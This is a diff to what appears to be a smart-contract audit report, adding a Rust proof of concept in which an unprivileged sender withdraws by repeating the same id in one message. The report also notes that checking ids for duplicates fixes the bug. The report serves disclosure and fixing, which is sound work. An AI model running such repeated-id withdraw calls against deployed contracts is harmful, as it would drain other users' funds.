@@ -15,8 +15,12 @@ The fix should be check `ids` in message for duplicates.
 
 ### Proof of concept
 
+See `exploit_withdraw_repeat_ids()` in integration tests.
 ```rust
-// code goes here
+// EXPLOIT: unprivileged repeated withdraw
+let msg = ExecuteMsg::Withdraw { ids: vec![2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2] };
+app.execute_contract(sender, contract_addr.clone(), &msg, &[])
+    .unwrap();
 
 ```
 
@@ -121,7 +125,7 @@ if state.proposed_owner != Some(info.sender.clone()) {
 
 ### Proof of concept
 
-See `exploit_ownership_flow` in `integration_tests.rs`.
+See `exploit_ownership_flow` in integration tests.
 
 ```rust
 // Ownership transfer
